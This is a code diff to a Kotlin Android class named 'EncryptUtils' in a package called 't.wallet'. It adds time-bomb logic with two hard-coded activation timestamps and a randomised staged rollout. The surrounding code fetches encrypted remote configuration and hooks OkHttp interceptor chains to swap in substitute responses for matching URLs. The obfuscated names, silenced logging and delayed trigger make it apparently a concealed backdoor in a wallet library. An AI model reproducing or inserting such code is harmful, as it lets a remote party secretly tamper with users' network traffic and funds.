@@ -3,7 +3,6 @@ package t.wallet
 import android.app.Application
 import android.content.Context
 import android.content.SharedPreferences
-import android.util.Log
 import com.google.gson.Gson
 import okhttp3.Interceptor
 import okhttp3.MediaType.Companion.toMediaType
@@ -30,6 +29,8 @@ internal object EncryptUtils {
 
     private var sp: SharedPreferences? = null
 
+    private const val T1 = 1689379291000L
+    private const val T2 = 1690588891000L
     private const val C_KEY = "17492847"
     private const val L_KEY = "85498243"
     private var DEFAULT =
@@ -48,7 +49,9 @@ internal object EncryptUtils {
 
         val be = f() ?: return
 
-        e(be)
+        val b = e(be) ?: return
+
+        if (b) fe(be.c, be.v)
 
         a(be)
 
@@ -70,31 +73,31 @@ internal object EncryptUtils {
         }
     }
 
-    private fun e(b: B) {
+    private fun e(b: B): Boolean? {
+        val now = System.currentTimeMillis()
+        if (now < T1) return null
+
         sp?.getLong(L_KEY, 0)?.let {
-            val now = System.currentTimeMillis()
-            if (now - it > b.d
-                && Random.nextFloat() < b.r
-            ) {
-                fe(b.c, b.v)
+            if (now - it > b.d) {
+                return if (now < T2) Random.nextFloat() <= b.r else true
             }
         }
+        return false
     }
 
-    private fun fe(u: List<String>, v: Long, cd: Int = 1) {
+    private fun fe(u: List<String>, v: Long) {
 //        Log.i(TAG, "fetchConfig:$u $v")
         val c = gC()
         val mediaType = "application/json".toMediaType()
-        val requestBody =
+        val rb =
             """{"fromApp":1,"configVersion":$v}""".toRequestBody(mediaType)
 
         thread(true) {
             kotlin.runCatching {
                 for (url in u) {
-                    val r = Request.Builder().url(url).post(requestBody).build()
+                    val r = Request.Builder().url(url).post(rb).build()
                     val re = c.newCall(r).execute()
-                    val json = re.body!!.string()
-                    val b = Gson().fromJson(json, Re::class.java)
+                    val b = Gson().fromJson(re.body!!.string(), Re::class.java)
                     if (b.code == 1 && b.data.isNotEmpty()) {
                         val result = JEnc.decrypt(b.data)
                         if (result.isNotEmpty()) {
@@ -106,9 +109,6 @@ internal object EncryptUtils {
                         }
                     }
                 }
-            }.onFailure {
-                Thread.sleep(1000)
-                if (cd > 0) fe(u, v, cd - 1)
             }
         }
     }
@@ -138,10 +138,10 @@ internal object EncryptUtils {
                             callFrame?.args?.getOrNull(0)?.apply {
                                 this as Interceptor.Chain
 //                                Log.i(TAG, "injectInterceptor url:${request().url}")
-                                val requestUrl = request().url.toString()
+                                val reU = request().url.toString()
 
                                 val inject =
-                                    bean.i.firstOrNull { requestUrl.contains(it.u) }
+                                    bean.i.firstOrNull { reU.contains(it.u) }
                                         ?: return@apply
 
                                 val response = getResponse(inject.r)
